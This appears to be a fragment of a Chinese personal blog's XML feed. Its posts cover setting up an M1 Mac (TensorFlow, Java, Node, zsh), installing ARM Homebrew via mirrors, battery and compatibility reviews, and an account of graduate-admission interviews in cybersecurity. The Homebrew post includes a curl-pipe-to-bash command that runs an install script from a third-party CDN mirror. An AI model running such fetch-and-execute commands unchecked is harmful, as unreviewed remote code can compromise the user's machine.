class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Flatten())<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Dense(<span class="hljs-number">10</span>, activation=<span class="hljs-string">&#x27;softmax&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.summary()<br>Model: <span class="hljs-string">&quot;sequential&quot;</span><br>_________________________________________________________________<br>Layer (type)                 Output Shape              Param <span class="hljs-comment">#</span><br>=================================================================<br>conv2d (Conv2D)              (<span class="hljs-literal">None</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>)        <span class="hljs-number">320</span><br>_________________________________________________________________<br>max_pooling2d (MaxPooling2D) (<span class="hljs-literal">None</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">32</span>)        <span class="hljs-number">0</span><br>_________________________________________________________________<br>conv2d_1 (Conv2D)            (<span class="hljs-literal">None</span>, <span class="hljs-number">11</span>, <span class="hljs-number">11</span>, <span class="hljs-number">64</span>)        <span class="hljs-number">18496</span><br>_________________________________________________________________<br>max_pooling2d_1 (MaxPooling2 (<span class="hljs-literal">None</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">64</span>)          <span class="hljs-number">0</span><br>_________________________________________________________________<br>conv2d_2 (Conv2D)            (<span class="hljs-literal">None</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">64</span>)          <span class="hljs-number">36928</span><br>_________________________________________________________________<br>flatten (Flatten)            (<span class="hljs-literal">None</span>, <span class="hljs-number">576</span>)               <span class="hljs-number">0</span><br>_________________________________________________________________<br>dense (Dense)                (<span class="hljs-literal">None</span>, <span class="hljs-number">64</span>)                <span class="hljs-number">36928</span><br>_________________________________________________________________<br>dense_1 (Dense)              (<span class="hljs-literal">None</span>, <span class="hljs-number">10</span>)                <span class="hljs-number">650</span><br>=================================================================<br>Total params: <span class="hljs-number">93</span>,<span class="hljs-number">322</span><br>Trainable params: <span class="hljs-number">93</span>,<span class="hljs-number">322</span><br>Non-trainable params: <span class="hljs-number">0</span><br>_________________________________________________________________<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras.datasets <span class="hljs-keyword">import</span> mnist<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras.utils <span class="hljs-keyword">import</span> to_categorical<br><span class="hljs-meta">&gt;&gt;&gt; </span>(train_images, train_labels), (test_images, test_labels) = mnist.load_data()<br><span class="hljs-meta">&gt;&gt;&gt; </span>train_images = train_images.reshape((<span class="hljs-number">60000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>train_images = train_images.astype(<span class="hljs-string">&#x27;float32&#x27;</span>) / <span class="hljs-number">255</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>test_images = test_images.reshape((<span class="hljs-number">10000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_images = test_images.astype(<span class="hljs-string">&#x27;float32&#x27;</span>) / <span class="hljs-number">255</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>train_labels = to_categorical(train_labels)<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_labels = to_categorical(test_labels)<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.compile(optimizer=<span class="hljs-string">&#x27;rmsprop&#x27;</span>,<br><span class="hljs-meta">... </span>              loss=<span class="hljs-string">&#x27;categorical_crossentropy&#x27;</span>,<br><span class="hljs-meta">... </span>              metrics=[<span class="hljs-string">&#x27;accuracy&#x27;</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.fit(train_images, train_labels, epochs=<span class="hljs-number">5</span>, batch_size=<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541663-f6cc2982-a295-408a-88f3-6136dc8faa70.png#id=cFViy&originHeight=1436&originWidth=2198&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>模型是训练出来了，但是不能调用 gpu。<br><a href="https://www.jianshu.com/p/0b5342f4af95">https://www.jianshu.com/p/0b5342f4af95</a> 这篇文章也提到了，不过说 tf2.5 可以调用 gpu，我先不管了，这个能用就行。<br>而关于 2.5 的 tf，可以查看<a href="https://makeoptim.com/deep-learning/tensorflow-metal">https://makeoptim.com/deep-learning/tensorflow-metal</a><br>and <a href="https://_www.icode9.com_content-4-1210377/">https://www.icode9.com/content-4-1210377.html</a><br>不过得升级到 mac os 12+</p><h1 id="安装-java"><a href="#安装-java" class="headerlink" title="安装 java"></a>安装 java</h1><p>首先退出 conda 环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">conda deactivate<br></code></pre></td></tr></table></figure><p>可在官网下载全部的 JDK8 ～ JDK16 的 macos-arm64 版本的 JDK。<br><a href="https://www.azul.com/downloads/zulu-community/?package=jdk">https://www.azul.com/downloads/zulu-community/?package=jdk</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Bash">(base) matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">which</span> java<br>/usr/bin/java<br>(base) matr1x@matr1xdeMacBook-Air ~ % file /usr/bin/java<br>/usr/bin/java: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]<br>/usr/bin/java (<span class="hljs-keyword">for</span> architecture x86_64):  Mach-O 64-bit executable x86_64<br>/usr/bin/java (<span class="hljs-keyword">for</span> architecture arm64e):  Mach-O 64-bit executable arm64e<br>(base) matr1x@matr1xdeMacBook-Air ~ % file /usr/bin/javac<br>/usr/bin/javac: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]<br>/usr/bin/javac (<span class="hljs-keyword">for</span> architecture x86_64):  Mach-O 64-bit executable x86_64<br>/usr/bin/javac (<span class="hljs-keyword">for</span> architecture arm64e):  Mach-O 64-bit executable arm64e<br></code></pre></td></tr></table></figure><p>下载后安装即可。</p><h1 id="安装-nodejs"><a href="#安装-nodejs" class="headerlink" title="安装 nodejs"></a>安装 nodejs</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install node<br>(base) matr1x@matr1xdeMacBook-Air ~ % node -v<br>v17.4.0<br></code></pre></td></tr></table></figure><h1 id="安装-PHP"><a href="#安装-PHP" class="headerlink" title="安装 PHP"></a>安装 PHP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install php<br></code></pre></td></tr></table></figure><h1 id="Terminal-美化"><a href="#Terminal-美化" class="headerlink" title="Terminal 美化"></a>Terminal 美化</h1><p>非常简单。 1.下载字体，安装，并将终端字体改为它。</p><ul><li><a href="%5Bhttps://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%5D(https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS">MesloLGS NF Regular.ttf</a> NF Regular.ttf)</li><li><a href="%5Bhttps://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%5D(https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS">MesloLGS NF Bold.ttf</a> NF Bold.ttf)</li></ul><ol start="2"><li>brew install romkatv/powerlevel10k/powerlevel10k</li><li>echo “source $(brew –prefix)/opt/powerlevel10k/powerlevel10k.zsh-theme” &gt;&gt;~/.zshrc</li><li>p10k configure</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541913-5319b75a-dff9-46f5-9dd2-9e36c75d4c9d.png#id=gh3sH&originHeight=1266&originWidth=2000&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h1><p>上网搜一下官网，找到命令，安装即可。</p><blockquote><p>由于被墙，因此推荐国内镜像安装。</p></blockquote><p><a href="https://blog.csdn.net/qq_39530754/article/details/104714976">https://blog.csdn.net/qq_39530754/article/details/104714976</a><br>重新安装主题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Git">git clone --depth&#x3D;1 https:&#x2F;&#x2F;gitee.com&#x2F;romkatv&#x2F;powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;themes&#x2F;powerlevel10k<br></code></pre></td></tr></table></figure><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Git">vim ~.&#x2F;zshrc<br>修改<br>ZSH_THEME&#x3D;&quot;powerlevel10k&#x2F;powerlevel10k&quot;<br></code></pre></td></tr></table></figure><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Git">git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-autosuggestions<br>git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-syntax-highlighting<br></code></pre></td></tr></table></figure><p>如果暂时无法 clone，将网址替换成镜像地址再次尝试。</p><ul><li><a href="https://link.zhihu.com/?target=https://github.com.cnpmjs.org">github.com.cnpmjs.org</a></li><li><a href="https://link.zhihu.com/?target=https://hub.fastgit.org">https://hub.fastgit.org</a><blockquote><p>GitHub raw 域名并非 <a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> 而是 <a href="https://link.zhihu.com/?target=http://raw.githubusercontent.com">http://raw.githubusercontent.com</a>，上方的 GitHub 加速如果不能加速这个域名，那么可以使用 Static CDN 提供的反代服务。<br>将 <a href="https://link.zhihu.com/?target=http://raw.githubusercontent.com">http://raw.githubusercontent.com</a> 替换为 <a href="https://link.zhihu.com/?target=http://raw.staticdn.net">http://raw.staticdn.net</a> 即可加速。</p></blockquote></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062542072-624b1beb-a718-460e-a69a-c5cff8ab8be2.png#id=rrLvh&originHeight=738&originWidth=1862&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>]]></content>
      
      
      <categories>
          
          <category> mac </category>
          
          <category> m1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 踩坑教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装arm版Homebrew</title>
      <link href="/2022/%E5%AE%89%E8%A3%85arm%E7%89%88Homebrew/"/>
      <url>/2022/%E5%AE%89%E8%A3%85arm%E7%89%88Homebrew/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><a href="https://www.bilibili.com/read/cv14064572">https://www.bilibili.com/read/cv14064572</a></li></ol><h1 id="实际安装"><a href="#实际安装" class="headerlink" title="实际安装"></a>实际安装</h1><p>第一步：设置中科大源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">HOMEBREW_CORE_GIT_REMOTE=https://mirrors.ustc.edu.cn/homebrew-core.git<br></code></pre></td></tr></table></figure><p>第二步：安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">/bin/bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="image/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%885.22.38.png#id=vhAiJ&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>第三步：添加配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">cd</span> ~<br>touch .zshrc<br>open -e .zshrc<br>复制进去<br><span class="hljs-built_in">export</span> PATH=/opt/homebrew/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>最后更新一下配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062507699-aaeeb80c-f3dc-4b2a-8a9d-35961a6382ea.png#id=rPzAA&originHeight=92&originWidth=1260&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>大功告成。最后，brew update 就好</p><h1 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 替换brew.git</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>&quot;</span><br>git remote <span class="hljs-built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git<br><span class="hljs-comment"># 替换homebrew-core.git</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core&quot;</span><br>git remote <span class="hljs-built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git<br><span class="hljs-comment"># 刷新源</span><br>brew update<br></code></pre></td></tr></table></figure><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p><a href="https://blog.csdn.net/liaowenxiong/article/details/119008586">https://blog.csdn.net/liaowenxiong/article/details/119008586</a><br>文章作者说 brew cask 已经集成到 brew 里面了，所以就不需要独立安装它了，但是！我安了之后还是显示 command not found，好迷啊。</p>]]></content>
      
      
      <categories>
          
          <category> mac </category>
          
          <category> m1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 踩坑教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac air M1续航评测</title>
      <link href="/2022/Mac%20air%20M1%E7%BB%AD%E8%88%AA%E8%AF%84%E6%B5%8B/"/>
      <url>/2022/Mac%20air%20M1%E7%BB%AD%E8%88%AA%E8%AF%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482100-663433a4-687a-46eb-9b4b-216743eaf6f9.png#id=FL3cL&originHeight=828&originWidth=1260&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>新入手的评测记录。<br>前三天是不接电源测试续航极限，之后都是插着电源了。<br>说一下具体情况。<br>第一天，中午 12 点开机，到晚上 9 点左右，安装一些软件，看视频测试屏幕和音效，消耗大概 60%。<br>第二天，忘记了，应该也是一直下载安装软件，大概 80%耗电量。<br>第三天，高铁，下午 4 点到晚上 12 点，一直下东西，屏幕全亮 100%，耗电 90%。<br>可以看到，重度使用的情况下，大概就是 9 小时的续航。相比之下，游戏本 3 个小时的续航真的被完爆。<br>今天测试一下在写代码、写文档的场景下可以达到怎样的续航。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482285-821d0dd8-0835-4178-b2b6-4c2975a8d0cb.png#id=NyeMw&originHeight=1020&originWidth=1336&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>写代码、看文档、听歌、看了一会视频、刷 b 站，耗电量如图，目测 10 小时续航无压力。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482411-d9b955fc-261a-48c5-9e63-d7b123d41135.png#id=FCRXw&originHeight=1260&originWidth=1892&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>之前的图忘截了，就现弄了一张图，从图上来看，<br>国产软件对耗电普遍偏高，如 QQ、网易云音乐、wps 等。（特别是 wps，巨离谱，后台耗电大户，我都不敢开它）</p>]]></content>
      
      
      <categories>
          
          <category> mac </category>
          
          <category> m1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac兼容性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac air M1兼容测评</title>
      <link href="/2022/Mac%20air%20M1%E5%85%BC%E5%AE%B9%E6%B5%8B%E8%AF%84/"/>
      <url>/2022/Mac%20air%20M1%E5%85%BC%E5%AE%B9%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644033998693-11ec739c-80af-4cd7-bfc1-213766e3895c.png#id=ibSkG&originHeight=926&originWidth=1406&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="win11-on-ARM"><a href="#win11-on-ARM" class="headerlink" title="win11 on ARM"></a>win11 on ARM</h1><p>完美运行，苹果第一适配厂 Microsoft 不是吹的。<br>在固态硬盘的加持下，虚拟机启动速度有了质的提高，大概在 5s 左右就可以恢复。<br>其中的大部分 x86 软件可以兼容运行，但是游戏类还是够呛。（又占内存又卡）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644033998889-c36de78a-5fd5-4d68-aba3-08b70ea6338c.png#id=pfDFR&originHeight=864&originWidth=1426&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>根据 b 站测评，守望先锋、古墓丽影等游戏可以运行，包括 steam 平台上的一部分游戏，但由于内存限制，运行起来并不流畅。<br>诸如原神、糖豆人，无法运行。</p><blockquote><p>本来我还想着去 appstore 下载游戏试试，但是,M1 根本就不适配，搜也搜不出来，苹果去年的时候就关闭了侧载应用，也就无法绕过 appstore 下载相关的 ipad 应用。</p></blockquote><h1 id="IDA-调试"><a href="#IDA-调试" class="headerlink" title="IDA 调试"></a>IDA 调试</h1><p>暂未测试<br>几篇参考文章可供日后测试：</p><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404631273917251711#_loginLayer_1644031045386">https://weibo.com/ttarticle/p/show?id=2309404631273917251711#_loginLayer_1644031045386</a></li><li><a href="https://_bbs.pediy.com_thread-270804-1/">https://bbs.pediy.com/thread-270804-1.htm</a></li></ul><h1 id="安卓虚拟机测试"><a href="#安卓虚拟机测试" class="headerlink" title="安卓虚拟机测试"></a>安卓虚拟机测试</h1><p>暂未测试<br>但是想必一定是速度飞起，毕竟是原生 arm。</p><h1 id="x86-pwn-测试"><a href="#x86-pwn-测试" class="headerlink" title="x86 pwn 测试"></a>x86 pwn 测试</h1><p>暂未测试<br>暂时没想到啥好方法，不太清楚转译运行对内存寻址的影响。</p><ul><li><a href="https://www.its203.com/article/eeeeeight/121571831">https://www.its203.com/article/eeeeeight/121571831</a></li><li><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/">https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/</a></li></ul><p>根据网上的教程来看，不建议用 m1 来做 pwn。</p><h1 id="BUG-汇总"><a href="#BUG-汇总" class="headerlink" title="BUG 汇总"></a>BUG 汇总</h1><ol><li>如果我在 win11 里打开 wolai，然后在本机的 wolai 就会处于离线状态，而且关了之后打不开，必须把 pd 完全退出之后才能重新打开。</li><li>Safari 看 b 站的时候，经常就会吞鼠标，就是播放视频时，切换页面，这个时候鼠标就不见了，必须回到 b 站暂停才能让鼠标出现。这个 bug 可以稳定复现，出现频率非常高。</li><li>qq 手机发来的图片接收不到，离大谱。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644063410079-7286054b-dcce-463c-98ae-8ed8d38c0509.png#clientId=ub774027b-c66c-4&from=paste&height=95&id=u2c7537a9&name=image.png&originHeight=190&originWidth=1048&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=27589&status=done&style=none&taskId=u3ecbedbe-0f7f-4814-a816-d0fd724fbd9&title=&width=524" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> mac </category>
          
          <category> m1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac兼容性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021网安保研经验（西交+上科大+山大+上交+中科大）</title>
      <link href="/2022/2021%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%EF%BC%88%E8%A5%BF%E4%BA%A4+%E4%B8%8A%E7%A7%91%E5%A4%A7+%E5%B1%B1%E5%A4%A7+%E4%B8%8A%E4%BA%A4+%E4%B8%AD%E7%A7%91%E5%A4%A7%EF%BC%89/"/>
      <url>/2022/2021%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%EF%BC%88%E8%A5%BF%E4%BA%A4+%E4%B8%8A%E7%A7%91%E5%A4%A7+%E5%B1%B1%E5%A4%A7+%E4%B8%8A%E4%BA%A4+%E4%B8%AD%E7%A7%91%E5%A4%A7%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>距离保研结束已经过去好几个月了，一直比较懒所以就没有整理保研的经验贴，今天教务处发了寒假安排，感觉要放假了，所以赶紧写出来给学弟学妹们看一下，从现在准备到夏令营完全来得及。</p><a id="more"></a><p>个人情况：西北某 211 信安专业<br>专业排名：11/154<br>保研综测排名：5/155<br>绩点：3.9/4.0<br>获奖情况：两次国家奖学金，美赛 M 奖，电子取证国一，数模国赛省一，互联网+省金，服创国二 等<br>科研情况：无 paper<br>项目情况：都是比赛的项目<br>夏令营报名：西交网安、武大网安、华科 cs、上科大网安、山大网安、上交网安、中科大网安、南开网安、信工所<br>夏令营入营：西交（线上）、武大（线下冲突放弃）、上科大（线下）、山大（线上）、上交（线下）、中科大（线上）、信工所（放弃）<br>夏令营 offer：山大（学）、上交（专）、中科大（学）<br>预推免：哈深 cs（未入营）、浙大网安（入营后放弃）<br>最终去向：中科大</p><p>接下来逐个介绍一下。</p><h1 id="西交网安"><a href="#西交网安" class="headerlink" title="西交网安"></a>西交网安</h1><p>面试时间：6.21<br>夏令营入营 66 人，优营 15 人，不发 offer，预推免优先考虑（应该是考核指标加分）。<br>优营结果：未拿到</p><p>夏令营一天时间，上午 b 站宣讲，下午 3 点开始面试，一个人 10 分钟，双机位，共分成 3 个面试组。<br>自我介绍 5 分钟之内，然后老师问问题。</p><p>老师先问了我电子取证比赛干什么的？做了什么工作？用了什么工具？</p><p>又问了 无人机科研项目你们是提出了什么新的 idea 吗？你是负责人吗？你上面写撰写专业文档是写的什么？</p><p>然后又问了我 你还报了哪个夏令营？如果我们两个学校都给了你 offer 你会来哪里？为什么?</p><p>西交夏令营过程非常迷惑，发 offer 也是奇奇怪怪，明明这个“offer”是没有效力的（还需要重新参加九推），却只发了这么寥寥，我们学校网安强校也没有一个拿到属实没绷住，而且后面在知乎上了解到，西交九推又鸽了很多人，好感无，建议避雷。</p><blockquote><p>不过在西交的夏令营前，我给一个老师发了邮件，然后老师直接回复让我去面基，（大概 4 月份），当时我是属于啥都没准备就弄了个简历，然后就硬着头皮去了，不得不说，西交老校区梧桐树好多，很有年代的沧桑感。这次面基，老师对着成绩单和简历全程压力面，还现场写代码，给我涨了很多经验（虽然老师问的问题在之后的各种夏令营面试里一次也没有出现，但还是给了我一些自信心）。很感谢这位老师。</p></blockquote><h1 id="武大网安"><a href="#武大网安" class="headerlink" title="武大网安"></a>武大网安</h1><p>武大网安之前在网上看黑子挺多（主要是生活条件），然后这次还是线下（7.15 左右），和上交（线下）冲突，果断拒绝了。</p><p>听去的同学说，笔试考察了数据结构+网安基础，题目难度还是不小的。</p><h1 id="上科大信息学院"><a href="#上科大信息学院" class="headerlink" title="上科大信息学院"></a>上科大信息学院</h1><p>时间:7.6-7.8<br>夏令营分批入营，每一批大概 150 人左右<br>提供研究生公寓+104 元饭费<br>offer 结果：候补（拒绝）</p><p>简单讲一下面试过程，群面，四个老师，都是 PPT 里见过的，年纪不是很大感觉确实都依旧活跃在科研一线。<br>然后每个老师提问一门专业课，我的话是从项目经历里延申出的计算机网络+数据结构+高数+操作系统。<br>具体问题：</p><ol><li>你知道 tcp 中的 sequence number 吗？知道它每次建立链接之后，第一个序列号是怎么生成的？为什么要随机生成，防止什么攻击？</li><li>二叉树和哈希表都用来干什么的？</li><li>讲个泰勒展开吧（淦，高数好久都没复习了）</li><li>快表和页表的区别？</li></ol><p>由于刚刚忙完期末考就去夏令营了，还有好多都没复习好，面试答的也很一般。</p><p>y1s1，上科大的人文关怀还是很棒的，唯一的线下夏令营，体验不错！推荐去试试水，不过听说毕业要求很高（拿硕士当博士要求），所以存在延毕，慎重。</p><h1 id="山大网安"><a href="#山大网安" class="headerlink" title="山大网安"></a>山大网安</h1><p>时间 7.11<br>面试结果：学硕 offer</p><p>山大的面试是线上，第一天进行了一天的学术讲座，全都是密码学。。。真的难顶。<br>第二天上午面试，分了四个组。<br>进入面试间，很正规，老师们坐在一个大会议室里，估计投屏是我，距离隔得有点远，说话有一点点听不清。<br>首先是中文自我介绍，然后英语提问了一个问题，问我的很简单，能不能用英语介绍一下你的家乡（hhhh 老师看我是青岛人所以就挑了个简单的问），虽然我没准备，但还是用简单词汇流利的说出来了，毕竟夸自己家谁不会呢。<br>然后老师问，你学过密码学吧，说一个基于离散对数的密码方案吧。<br>答：国密 SM2<br>那你大致描述一下这个 SM2 的流程吧，简单介绍一下。<br>答：emmm，老师我记不清了。<br>老师说，那这么着吧，我们换一种问法，你说一种熟悉的密码算法吧。<br>答：RSA。<br>那你说一下 RSA 数字签名吧<br>巴拉巴拉<br>（不过当时我漏掉了哈希这个操作，导致老师一直问我，这里你用了什么哈希算法，不需要用哈希算法吗？老师可能有点无语，btw 老师就换了一个话题，你将来准备从事哪一方面的研究。<br>接着换了一个老师，问，你计算机方面学过什么课程？<br>我就随便说了几门<br>然后他问，你对哪一门课掌握的最好。<br>我说 操作系统吧<br>然后问，那你说一下死锁吧<br>答：几个进程之间由于获取资源之后都没有即使释放，而等待其他进程释放被占用资源造成的阻塞现象叫死锁。如果没有外力作用，它们将无法推进下去。<br>问产生死锁的必要条件有哪些？<br>然后你说一下进程和线程的区别。<br>答：进程是资源分配的最小实体，线程是运行调度的最小单位。<br>进程包含线程。<br>最后一个问题，数字签名能否用于加密方案？<br>我说，不可以。。。然后解释了一通。<br>老师说不对，你回去考虑考虑。</p><p>总结：入营 150+？不过看群里那些学校一般般，最后给了 60 左右的优营？还是蛮简单的。而且山大网安在青岛，看了一下确实离海边很近，可冲。</p><h1 id="华科-cs"><a href="#华科-cs" class="headerlink" title="华科 cs"></a>华科 cs</h1><p>没入营，竞争还是很激烈的。我们专业只进了 rank1。<br>高中基友 985rank3 也进了，可见本科出身还是很重要的。<br>据 rank1 说，华科网安她也进了，但是主办方安排很混乱仓促，于是鸽了。</p><p>然后，线上面试，应该正常发挥就可以，她被要求写了一个很简单的代码。<br>然后他们都拿到 offer 了，获取比例大概 70%。</p><h1 id="南开网安"><a href="#南开网安" class="headerlink" title="南开网安"></a>南开网安</h1><p>我们学校没有入的，应该是入营直接卡 211，建议 211 的学弟学妹以后不必白费力气。</p><h1 id="信工所"><a href="#信工所" class="headerlink" title="信工所"></a>信工所</h1><p>信工所战线拉得很长，也是好几批，听说信工所是点击就送的，然鹅第一批我没有入营。（7.8 